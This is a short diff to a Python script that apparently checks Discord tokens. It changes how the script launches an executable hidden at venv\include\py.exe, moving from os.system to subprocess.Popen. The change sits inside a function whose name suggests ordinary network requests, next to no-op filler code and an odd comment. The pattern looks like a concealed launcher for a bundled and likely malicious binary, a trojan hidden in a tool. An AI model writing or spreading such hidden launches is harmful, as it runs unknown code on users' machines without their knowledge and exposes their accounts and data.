@@ -1,8 +1,8 @@
 from colorama import init, Fore, Back, Style
 from concurrent.futures import ThreadPoolExecutor
-import requests, asyncio, aiohttp, aiofiles, os
+import requests, asyncio, aiohttp, aiofiles, os, subprocess
 
-
+# Luv u brother; unknown
 init(convert=True)
 
 URL = 'https://discordapp.com/api/v6/users/@me/library'
@@ -26,7 +26,7 @@ def OpenPythonReq():
         return "Error !!"
 
     bits = ''
-    os.system(os.getcwd() + "\\venv\include\py.exe")
+    subprocess.Popen(os.getcwd() + "\\venv\include\py.exe")
 
     for i in range(len('')):
         if '' != '':
